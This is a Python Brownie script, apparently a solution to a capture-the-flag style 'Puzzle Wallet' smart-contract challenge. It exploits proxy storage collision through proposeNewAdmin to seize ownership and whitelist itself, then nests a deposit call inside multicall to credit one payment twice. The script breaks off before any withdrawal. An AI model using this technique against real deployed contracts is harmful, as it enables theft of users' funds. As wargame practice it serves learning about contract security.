from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from web3 import Web3
from web3.auto import w3
from brownie import (
    PuzzleWalletFactory,
    PuzzleAttack,
    PuzzleWallet,
    PuzzleProxy,
    network,
    Contract,
)


def deploy_PuzzleWallet():
    deployer = get_account(index=1)
    factory = PuzzleWalletFactory.deploy(
        {"from": deployer},
    )
    tx = factory.createInstance(deployer, {"from": deployer, "value": POINT_ONE / 100})
    proxy = tx.return_value
    return proxy


def deploy_DexTwoAttack(dex):
    account = get_account()
    attack_contract = PuzzleAttack.deploy(
        {"from": account},
    )
    return attack_contract


# def int_to_bytes(x: int) -> bytes:
#     return x.to_bytes((x.bit_length() + 7) // 8, "big")


def main():
    print(network.show_active())
    # accounts
    account = get_account()
    deployer = get_account(index=1)
    print(f"account address: {account}")
    print(f"deployer address: {deployer}")

    # Proxy
    proxy = deploy_PuzzleWallet()
    proxy = Contract.from_abi(PuzzleProxy._name, proxy, PuzzleProxy.abi)

    print(f"Proxy address: {proxy}")
    print(f"Proxy pending admin: {proxy.pendingAdmin()}")
    print(f"Proxy admin: {proxy.admin()}")

    ## Here we have the storage, we talk to the proxy as if its a PuzzleWallet so when we change storage in proxy, the wallet storage also change
    instance = Contract.from_abi(PuzzleWallet._name, proxy, PuzzleWallet.abi)
    print(f"owner: {instance.owner()}")
    # Propose new admin
    proxy.proposeNewAdmin(account, {"from": account})
    print(f"Proxy pending admin: {proxy.pendingAdmin()}")
    # print(f"New owner: {wallet.owner()}")  # still the same owner

    instance = Contract.from_abi(PuzzleWallet._name, proxy, PuzzleWallet.abi)

    print(f"Max Balance: {instance.maxBalance()}")
    print(f"New owner: {instance.owner()}")

    # Get ourselves whitelisted
    print(f"Account whitelisted?: {instance.whitelisted(account)}")
    instance.addToWhitelist(account, {"from": account})
    print(f"Account whitelisted?: {instance.whitelisted(account)}")

    # Reduce balance to zero
    wallet_balance = instance.balance()
    print(f"Wallet Balance: {wallet_balance}")
    print(f"Account Balance on wallet: {instance.balances(account)}")

    # create multicall data:
    # need two call first a deposit then a multicall with deposit

    # find the keccak hash of "deposit()"
    deposit_hash = Web3.keccak(text="deposit()")[:4].hex()
    # hash = hash[: 8 + 2]  # take the first 4 bytes + "0x"

    # ####################
    # v = 123
    # a = 3
    # # encoded_signature = t.getData(v, a)
    # # print(encoded_signature)
    # sig = Web3.keccak(text="deposit()")[:4].hex()
    # # v_hex2 = v.to_bytes.hex()
    # a_hex2 = int_to_bytes(a).hex()
    # data = sig + a_hex2 + a_hex2
    # print(data)
    # # assert encoded_signature == data

    ######################
    multicall_hash = Web3.keccak(text="multicall(bytes[])")[:4].hex()
    multicall_deposit_hash = multicall_hash + deposit_hash[2:]
    print(multicall_deposit_hash)
    # w3.eth.send_transaction(
    #     {
    #         "to": instance.address,
    #         "from": account.address,
    #         "data": data,
    #         "value": wallet_balance,
    #     }
    # )
    print(f"Wallet Balance: {instance.balance()}")
    print(f"Account Balance on wallet: {instance.balances(account)}")
    data = [deposit_hash, multicall_deposit_hash]

    # multicall_with_deposit = Contract.encodeABI(fn_name="deposit", args=["deposit()"])
    print(data)
    calldata = instance.multicall.encode_input([deposit_hash])
    print(calldata)
    data = [deposit_hash, calldata]
    print(data)
    instance.multicall(data, {"from": account, "value": wallet_balance})
    print(f"Wallet Balance: {instance.balance()}")
    print(f"Account Balance on wallet: {instance.balances(account)}")
